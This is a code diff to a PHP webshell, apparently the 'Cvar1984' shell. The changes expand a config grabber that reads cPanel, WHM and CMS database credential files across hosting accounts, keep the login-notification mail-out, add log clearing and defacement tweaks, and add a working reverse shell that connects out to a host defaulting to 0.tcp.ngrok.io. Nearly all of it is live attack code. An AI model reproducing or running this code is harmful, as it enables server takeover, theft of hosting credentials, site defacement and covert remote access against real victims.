@@ -25,16 +25,19 @@ session_start();
 set_time_limit(0);
 ini_set('max_execution_time', 0);
 ini_set('memory_limit', '999999999M');
+ini_set('zlib.output_compression', 'Off');
 ini_restore('safe_mode');
 ini_restore("safe_mode_include_dir");
 ini_restore("safe_mode_exec_dir");
 ini_restore("disable_functions");
 ini_restore("allow_url_fopen");
+ini_restore("open_basedir");
 ignore_user_abort(0);
-ini_set('zlib.output_compression', 'Off');
+
 
 $auth_pass = "5a3844a15924bd86558bb85026e633f89d23c191"; // sha1('tuzki')
-$email = "gedzsarjuncomuniti@gmail.com"; // Your Email
+$email = ""; // Your Email
+
 if (strtolower(substr(PHP_OS, 0, 3)) == "win") {
 	$sep = substr('\\', 0, 1);
 	$os = "Windows";
@@ -91,6 +94,12 @@ error was encountered while trying to use an ErrorDocument to handle the request
 if (!isset($_SESSION[sha1(md5($_SERVER['HTTP_HOST'])) ])) {
 	if (empty($auth_pass) or (isset($_GET['pass']) and sha1($_GET['pass']) == $auth_pass)) {
 		$_SESSION[sha1(md5($_SERVER['HTTP_HOST'])) ] = true;
+		if(!function_exists('file_get_contents')) {
+			echo "<script>alert('file_get_contents function disabled, this webshell not working properly')</script>";
+		}
+		if(!function_exists('file_put_contents')) {
+			echo "<script>alert('file_put_contents function disabled, this webshell not working properly')</script>";
+		}
 		$shell_path = $content_mail = "URL : http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'] . "\n\nIP : " . $_SERVER['REMOTE_ADDR'] . "\n\nPassword : " . $auth_pass . "\n\nBy Cvar1984";
 		if(!empty($email)) {
 			@mail($email, "Logs", $content_mail, "From:Cvar1984");
@@ -153,7 +162,25 @@ if (!isset($_SESSION[sha1(md5($_SERVER['HTTP_HOST'])) ])) {
 	table,
 	tr,
 	td {
-		border: 1px 
+		border: 1px;
+		-webkit-border: 1px;
+		-moz-border: 1px;
+		-o-border: 1px;
+	}
+
+	table {
+		-webkit-width:800px;
+		-moz-width:800px;
+		-o-width:800px;
+		-webkit-height:auto;
+		-moz-height:auto;
+		-o-height:auto;
+		width:800px;
+		height:auto;
+	}
+
+	nav {
+
 	}
 
 	.table-hover {
@@ -195,9 +222,12 @@ if (!isset($_SESSION[sha1(md5($_SERVER['HTTP_HOST'])) ])) {
 		height: 20px;
 	}
 	.iframe {
+		-webkit-width: 100vw;
+		-moz-width: 100vw;
+		-o-width: 100vw;
 		width: 100vw;
 		height: 100vh;
-		position: relative;"
+		position: relative;
 	}
 	span {
 		color:red;
@@ -252,7 +282,8 @@ function hapus($dir) {
 	}
 }
 
-function spamsms() {
+function spamsms()
+{
 ?>
 <center>
 		<h2>Multi Spam SMS</h2>
@@ -285,19 +316,22 @@ function spamsms() {
 	die();
 }
 
-function music() {
+function music()
+{
 	echo "<center>";
 	echo "<iframe width='700px' height='500px' scrolling='no' frameborder='no' src='https://w.soundcloud.com/player/?url=https://api.soundcloud.com/playlists/355874911&amp;color=#00cc11&amp;auto_play=true&amp;hide_related=false&amp;show_comments=true&amp;show_user=true&amp;show_reposts=false&amp;show_teaser=true&amp;visual=true'></iframe>";
 	echo "</center>";
 	die();
 }
 
-function jumping() {
+function jumping()
+{
 	alert("This feature under development");
 }
 
-function config() {
-	// grab config by indoXploit
+function config()
+{
+	// grab config by indoXploit (Improved)
 	global $dir;
 	if (!file_exists('.config')) {
 		mkdir(".config");
@@ -331,17 +365,33 @@ function config() {
 			}
 			else {
 				preg_match_all('/(.*?):x:/', $passwd, $user_config);
+				if(file_exists('/home/')) {
+				$home='home';	
+				}
+				elseif(file_exists('/home1/')) {
+				$home='home1';					
+				} 
+				elseif(file_exists('/home2/')) {
+				$home='home2';					
+				}
+				elseif(file_exists('/home3/')) {
+				$home='home3';					
+				}
+				elseif(file_exists('/home4/')) {
+				$home='home4';					
+				}
 				foreach ($user_config[1] as $user_idx) {
-					$user_config_dir = "/home/$user_idx/public_html";
+					$user_config_dir = "/$home/$user_idx/public_html";
 					if (is_readable($user_config_dir)) {
 						$grab_config = array(
-							"/home/$user_idx/.my.cnf" => "cpanel",
-							"/home/$user_idx/.accesshash" => "WHM-accesshash",
+							"/$home/$user_idx/.my.cnf" => "cpanel",
+							"/$home/$user_idx/.accesshash" => "WHM-accesshash",
 							"$user_config_dir/po-content/config.php" => "Popoji",
 							"$user_config_dir/vdo_config.php" => "Voodoo",
 							"$user_config_dir/bw-configs/config.ini" => "BosWeb",
 							"$user_config_dir/config/koneksi.php" => "Lokomedia",
 							"$user_config_dir/lokomedia/config/koneksi.php" => "Lokomedia",
+							"$user_config_dir/koneksi.php" => "Lokomedia",
 							"$user_config_dir/clientarea/configuration.php" => "WHMCS",
 							"$user_config_dir/whm/configuration.php" => "WHMCS",
 							"$user_config_dir/whmcs/configuration.php" => "WHMCS",
@@ -357,10 +407,20 @@ function config() {
 							"$user_config_dir/admin/config.php" => "OpenCart",
 							"$user_config_dir/slconfig.php" => "Sitelok",
 							"$user_config_dir/application/config/database.php" => "Ellislab",
+							"$user_config_dir/config/database.php" => "Ellislab",
 							"$user_config_dir/models/db-settings.php" => "Usercake",
 							"$user_config_dir/config/database.php" => "Laravel",
+							"$user_config_dir/database.php" => "Laravel",
 							"$user_config_dir/application/config.ini" => "Zend",
-							"$user_config_dir/config/app.php" => "CakePHP"
+							"$user_config_dir/config/app.php" => "CakePHP",
+							"$user_config_dir/phalcon/config/adapter/ini.zep" => "Phalcon",
+							"$user_config_dir/config/adapter/ini.zep" => "Phalcon",
+							"$user_config_dir/app/config/configuration.yml"	=> "Symphony",
+							"$user_config_dir/app/config/databases.yml"	=> "Symphony",
+							"$user_config_dir/config/configuration.yml"	=> "Symphony",
+							"$user_config_dir/config/databases.yml"	=> "Symphony",
+							"$user_config_dir/config/db.php" => "FuelPHP & Yii2",
+							"$user_config_dir/src/settings.php" => "Slim",
 						);
 						foreach ($grab_config as $config => $nama_config) {
 							$ambil_config = @file_get_contents($config);
@@ -776,7 +836,7 @@ function chmods($filename) {
 }
 
 function clear_logs() {
-	global $os, $dir;
+	global $os;
 	if ($os == 'Linux') {
 		@hapus('/tmp/logs');
 		@hapus('/root/.ksh_history');
@@ -875,12 +935,15 @@ function ngindex() {
 		<tr>
 			<td>Image Link</td> <td>:</td> 
 			<td><input type='text' class='input-sm' id='input' value='https://cvar1984.github.io/logo.png' name='images'></td>
+			</tr>
 		<tr>
 			<td>Content</td> <td>:</td>
 			<td><input type='text' class='input-sm' id='input' value='Hacked By Cvar1984' name='content'></td>
+			</tr>
 		<tr>
 			<td>Sub Content</td> <td>:</td>
 			<td><input type='text' class='input-sm' id='input' value='This Pain Is Wonderful' name='sub_content'></td>
+			</tr>
 		</table>
 		<center>
 			<br /><input type='submit' class='btn btn-danger' name='action' value='Deface'>
@@ -961,6 +1024,141 @@ function newfile($file)
 	}
 }
 
+function network()
+{
+	if(isset($_POST['action'])) {
+	$chunk_size = 1400;
+	$write_a	= null;
+	$error_a	= null;
+	$daemon	 = 0;
+	$debug	  = 0;
+	$ip=$_POST['ip'];
+	$port=$_POST['port'];
+	function printit($string) {
+		global $daemon;
+			if(!$daemon) {
+				print "$string\n";
+			}
+		}
+		if(function_exists('pcntl_fork')) {
+			$pid = pcntl_fork();
+			if($pid == -1) {
+				printit("ERROR: Can't fork");
+				exit(1);
+			}
+			if($pid) {
+				exit(0);
+			}
+			if(posix_setsid() == -1) {
+				printit("Error: Can't setsid()");
+				exit(1);
+			}
+			$daemon = 1;
+		} else {
+			printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
+		}
+		chdir("/");
+		umask(0);
+		$sock = fsockopen($ip, $port, $errno, $errstr, 30);
+		if(!$sock) {
+			printit("$errstr ($errno)");
+			exit(1);
+		}
+		$descriptorspec = array(
+			0 => array(
+				"pipe",
+				"r"
+			),
+			1 => array(
+				"pipe",
+				"w"
+			),
+			2 => array(
+				"pipe",
+				"w"
+			)
+		);
+		$process		= proc_open($shell, $descriptorspec, $pipes);
+		if(!is_resource($process)) {
+			printit("ERROR: Can't spawn shell");
+			exit(1);
+		}
+		stream_set_blocking($pipes[0], 0);
+		stream_set_blocking($pipes[1], 0);
+		stream_set_blocking($pipes[2], 0);
+		stream_set_blocking($sock, 0);
+		printit("<font color=yellow>Successfully opened reverse shell to $ip:$port </font>");
+		while(1) {
+			if(feof($sock)) {
+				printit("ERROR: Shell connection terminated");
+				break;
+			}
+			if(feof($pipes[1])) {
+				printit("ERROR: Shell process terminated");
+				break;
+			}
+			$read_a			  = array(
+				$sock,
+				$pipes[1],
+				$pipes[2]
+			);
+			$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
+			if(in_array($sock, $read_a)) {
+				if($debug)
+					printit("SOCK READ");
+				$input = fread($sock, $chunk_size);
+				if($debug)
+					printit("SOCK: $input");
+				fwrite($pipes[0], $input);
+			}
+			if(in_array($pipes[1], $read_a)) {
+				if($debug)
+					printit("STDOUT READ");
+				$input = fread($pipes[1], $chunk_size);
+				if($debug)
+					printit("STDOUT: $input");
+				fwrite($sock, $input);
+			}
+			if(in_array($pipes[2], $read_a)) {
+				if($debug)
+					printit("STDERR READ");
+				$input = fread($pipes[2], $chunk_size);
+				if($debug)
+					printit("STDERR: $input");
+				fwrite($sock, $input);
+			}
+		}
+		fclose($sock);
+		fclose($pipes[0]);
+		fclose($pipes[1]);
+		fclose($pipes[2]);
+		proc_close($process);
+	} else {
+?>
+<center>
+<h2>Reverse Shell</h2>
+<form method='post'>
+	<table align="center">
+	<tr>
+		<td align="center"><input type='text' class='input-sm' id='input' value='0.tcp.ngrok.io' name='ip'/></td>
+	</tr>
+	<tr>
+		<td align="center"><input type='text' class='input-sm' id='input' value='666' name='port'/></td>
+	</tr>
+	<tr>
+		<td colspan="3">
+			<center>
+				<input type='submit' class='btn btn-danger' name='action' value='Open Connection'/>
+			</center>
+		</td>
+	</tr>
+</table>
+</form>
+	<?php
+	die();
+	}
+}
+
 // END FUNCTION
 
 ?>
@@ -984,7 +1182,7 @@ function newfile($file)
 					<li><a href='?do=cgi'><span class="glyphicon glyphicon-duplicate"></span> CGI Shell</a></li>
 					<li><a href='?do=deface'><span class="glyphicon glyphicon-user"></span> Auto Deface</a></li>
 					<li><a href='?do=shortlink'><span class="glyphicon glyphicon-link"></span> Shortlink Generator</a></li>
-					<li><a href='?'><span class="glyphicon glyphicon-globe"></span> Network</a></li>
+					<li><a href='?do=network'><span class="glyphicon glyphicon-globe"></span> Network</a></li>
 				</ul>
 			</li>
 			<li><a href='?do=logout'><span class="glyphicon glyphicon-off"></span> Logout</a></li>
@@ -1061,6 +1259,9 @@ if(isset($_GET['do'])):
 	}
 	elseif($_GET['do'] == 'touch' and isset($_GET['files'])) {
 		newfile($_GET['files']);
+	}
+	elseif ($_GET['do'] == 'network') {
+		network();
 	}
 
 endif;
